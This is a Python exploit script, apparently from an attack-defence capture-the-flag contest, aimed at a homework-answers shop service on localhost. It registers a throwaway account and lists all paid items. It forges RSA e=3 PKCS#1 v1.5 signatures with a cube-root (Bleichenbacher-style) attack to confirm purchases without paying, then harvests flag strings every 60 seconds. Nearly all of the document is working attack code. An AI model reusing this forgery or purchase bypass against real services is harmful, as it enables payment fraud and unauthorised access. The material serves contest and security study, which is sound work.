import requests
import uuid
import json
import time
import re
from gmpy2 import iroot
from cryptohash import sha1
from Crypto.Util.number import bytes_to_long, long_to_bytes

n = 160301046244593794374726426877457303604019537423736458260136643925405546154653037172463089669436445456557499425029994701102494179131569495553118775092473011745647436677950345054183103280168169605050154349614937369702539109115434630721210013794356412532578527347021846882486616784364644818143571566741240343519
e = 3

BASE_URL = "http://localhost:8000"


def register_user(username: str, password: str, realname: str = None):
    url = f"{BASE_URL}/register"
    headers = {"Content-Type": "application/json"}
    data = {
        "username": username,
        "password": password,
    }
    if realname:
        data["realname"] = realname

    try:
        response = requests.post(url, json=data, headers=headers, timeout=5)
        response.raise_for_status()
        print("Регистрация успешна:", response.json())
        return response.json()
    except requests.exceptions.HTTPError as e:
        print(f"Ошибка при регистрации {username}: {e.response.status_code} {e.response.text}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"Ошибка запроса при регистрации {username}: {str(e)}")
        return None


def login_user(username: str, password: str):
    url = f"{BASE_URL}/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "username": username,
        "password": password
    }

    try:
        response = requests.post(url, data=data, headers=headers, timeout=5)
        response.raise_for_status()
        print("Вход успешен:", response.json())
        return response.json()
    except requests.exceptions.HTTPError as e:
        print(f"Ошибка при входе {username}: {e.response.status_code} {e.response.text}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"Ошибка запроса при входе {username}: {str(e)}")
        return None


def get_categories():
    url = f"{BASE_URL}/category"
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.get(url, headers=headers, timeout=5)
        response.raise_for_status()
        categories = response.json()
        return categories
    except requests.exceptions.HTTPError as e:
        print(f"Ошибка при получении категорий: {e.response.status_code} {e.response.text}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"Ошибка запроса при получении категорий: {str(e)}")
        return None


def get_subjects_by_category(category: str):
    url = f"{BASE_URL}/subjects/{category}?limit=5"
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.get(url, headers=headers, timeout=5)
        response.raise_for_status()
        subjects = response.json()
        return subjects
    except requests.exceptions.HTTPError as e:
        print(f"Ошибка при получении предметов для категории '{category}': {e.response.status_code} {e.response.text}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"Ошибка запроса для предметов категории '{category}': {str(e)}")
        return None


def get_all_paid_gdz(token: str):
    categories = get_categories()
    if not categories:
        print("Не удалось получить категории для запроса ГДЗ")
        return None

    all_gdz = []
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    for category in categories:
        subjects = get_subjects_by_category(category)
        if not subjects:
            continue

        for subject in subjects:
            combined_category = f"{category}_{subject}"
            url = f"{BASE_URL}/gdz_category/{combined_category}"
            data = {
                "limit":  20
            }
            try:
                response = requests.get(url, headers=headers,  timeout=5)
                response.raise_for_status()
                gdz_list = [x for x in response.json() if x["price"] > 0]
                all_gdz.extend(gdz_list)
            except requests.exceptions.HTTPError as e:
                print(f"Ошибка получения ГДЗ для '{combined_category}': {e.response.status_code} {e.response.text}")
                continue
            except requests.exceptions.RequestException as e:
                print(f"Ошибка запроса для ГДЗ '{combined_category}': {str(e)}")
                continue

    return all_gdz


def purchase_gdz(token: str, gdz_id: int):
    url = f"{BASE_URL}/gdz/{gdz_id}/purchase"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    try:
        response = requests.post(url, headers=headers, timeout=5)
        response.raise_for_status()
        print(f"Код подтверждения для ГДЗ {gdz_id}:", response.json())
        return response.json().get("confirmation_code")
    except requests.exceptions.HTTPError as e:
        print(f"Ошибка при запросе покупки ГДЗ {gdz_id}: {e.response.status_code} {e.response.text}")
        return None


def confirm_purchase(token: str, gdz_id: int, confirmation: int):
    url = f"{BASE_URL}/gdz/{gdz_id}/confirm-purchase"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }
    data = {
        "value": confirmation
    }

    try:
        response = requests.post(url, json=data, headers=headers, timeout=5)
        response.raise_for_status()
        print(f"Покупка ГДЗ {gdz_id} подтверждена:", response.json())
        return response.json()
    except requests.exceptions.HTTPError as e:
        print(f"Ошибка при подтверждении покупки ГДЗ {gdz_id}: {e.response.status_code} {e.response.text}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"Ошибка запроса для подтверждения покупки ГДЗ {gdz_id}: {str(e)}")
        return None


def get_gdz_full(token: str, gdz_id: int):
    url = f"{BASE_URL}/gdz/{gdz_id}/full"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    try:
        response = requests.get(url, headers=headers, timeout=5)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.HTTPError as e:
        print(f"Ошибка при получении ГДЗ {gdz_id}: {e.response.status_code} {e.response.text}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"Ошибка запроса для ГДЗ {gdz_id}: {str(e)}")
        return None


def forge_signature(message):
    length = len(bin(n)) - 2
    n_bytes = (length + 7) // 8
    block = b'\x00\x01\xff\x00' + bytes.fromhex(sha1(message))
    padding_length = n_bytes - len(block)
    garbage = padding_length * b'\xff'
    block = block + garbage

    forged_sig = iroot(bytes_to_long(block), e)[0]
    print(forged_sig)
    return int(forged_sig)


def run_script():
    print(f"\n[+] Запуск скрипта в {time.strftime('%H:%M:%S')}")

    unique_username = f"user_{uuid.uuid4().hex[:8]}"
    password = "securepassword123"
    realname = "Test User"

    print(f"Регистрация пользователя: {unique_username}")
    register_response = register_user(unique_username, password, realname)
    if not register_response:
        print("Не удалось зарегистрировать пользователя")
        return

    print(f"\nВход пользователя: {unique_username}")
    login_response = login_user(unique_username, password)
    if not login_response:
        print("Не удалось войти")
        return

    access_token = login_response.get("access_token")
    if not access_token:
        print("Токен доступа не получен")
        return
    print(f"Получен токен доступа: {access_token}")

    print("\nПолучение всех платных ГДЗ")
    all_gdz = get_all_paid_gdz(access_token)
    if all_gdz is None:
        print("Не удалось получить ГДЗ")
        return
    elif not all_gdz:
        print("Платные ГДЗ не найдены")
        return

    print(f"Найдено платных ГДЗ: {len(all_gdz)}")

    purchased_gdz = []
    pattern = re.compile(r'TEAM[0-9]{3}_[A-Z0-9]{32}')

    for gdz in all_gdz:
        gdz_id = gdz["id"]
        print(f"\nОбработка ГДЗ: ID={gdz_id}, Описание={gdz['description']}")

        confirmation_code = purchase_gdz(access_token, gdz_id)
        if not confirmation_code:
            print(f"Пропуск ГДЗ {gdz_id}: не удалось получить код подтверждения")
            continue

        sign = forge_signature(confirmation_code)
        confirm_purchase(access_token, gdz_id, sign)

        gdz_full = get_gdz_full(access_token, gdz_id)
        if gdz_full:
            full_description = gdz_full.get('full_description', 'Полное описание отсутствует')
            print(f"Полное описание ГДЗ {gdz_id}: {full_description}")
            if pattern.match(full_description):
                purchased_gdz.append({
                    "id": gdz_id,
                    "full_description": full_description,
                })
                print(f"ГДЗ {gdz_id} добавлено в результат: content_text соответствует шаблону")
            else:
                print(f"ГДЗ {gdz_id} пропущено: content_text не соответствует шаблону")
        else:
            print(f"Пропуск ГДЗ {gdz_id}: не удалось получить полные данные")

    print("\nИтоговый список купленных ГДЗ:")
    if purchased_gdz:
        for gdz in purchased_gdz:
            print(f"Flag: {gdz['full_description']}", flush=True)
    else:
        print("Ни одно ГДЗ не было успешно куплено или не соответствует шаблону")


if __name__ == "__main__":
    while True:
        run_script()
        print("[+] Ожидание 60 секунд перед следующим запуском...")
        time.sleep(60)